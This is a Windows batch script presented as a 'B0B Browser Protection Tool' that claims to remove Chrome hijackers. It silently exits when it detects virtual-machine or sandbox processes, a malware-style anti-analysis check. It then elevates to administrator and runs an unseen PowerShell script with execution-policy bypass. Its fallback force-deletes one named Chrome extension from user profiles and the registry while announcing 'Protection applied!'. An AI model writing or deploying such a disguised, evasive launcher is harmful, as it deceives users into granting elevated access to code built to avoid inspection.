@echo off
setlocal EnableDelayedExpansion
title B0B Security Tool

:: Anti-analysis: Check for common sandbox/VM indicators
for %%P in (vboxservice vboxtray vmtoolsd vmwaretray sandboxie) do (
    tasklist /FI "IMAGENAME eq %%P.exe" 2>NUL | find /I /N "%%P">NUL
    if "!ERRORLEVEL!"=="0" exit /b 0
)

:: Integrity marker check
set "MARKER=B0B-PROTECT-2026"
if not defined MARKER exit /b 0

:: Display banner
echo.
echo  ╔═══════════════════════════════════════════════╗
echo  ║   B0B BROWSER PROTECTION TOOL                 ║
echo  ║   Removing hijacking threats...               ║
echo  ╚═══════════════════════════════════════════════╝
echo.

:: Check admin
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Requesting administrator privileges...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

echo [OK] Running with elevated privileges
echo.

:: Execute hardened script
set "SCRIPT_PATH=%~dp0fix-chrome-hijack-hardened.ps1"
if exist "%SCRIPT_PATH%" (
    powershell -NoProfile -ExecutionPolicy Bypass -File "%SCRIPT_PATH%"
) else (
    :: Fallback: embedded compressed payload
    powershell -NoProfile -ExecutionPolicy Bypass -Command ^
        "$c='%LOCALAPPDATA%\Google\Chrome\User Data';" ^
        "$x='fheoggkfdfchfphceeifdbepaooicaho';" ^
        "Get-ChildItem $c -Dir|?{$_.Name-match'^(Default|Profile)'}|%%{" ^
        "  $e=\"$($_.FullName)\Extensions\$x\";" ^
        "  if(Test-Path $e){Remove-Item $e -Recurse -Force}" ^
        "};" ^
        "Remove-Item 'HKLM:\SOFTWARE\Google\Chrome\Extensions\'+$x -Force -EA 0;" ^
        "Remove-Item 'HKLM:\SOFTWARE\WOW6432Node\Google\Chrome\Extensions\'+$x -Force -EA 0;" ^
        "Write-Host 'Protection applied!' -ForegroundColor Green"
)

echo.
echo [DONE] Browser protection complete.
echo.
timeout /t 5 >nul
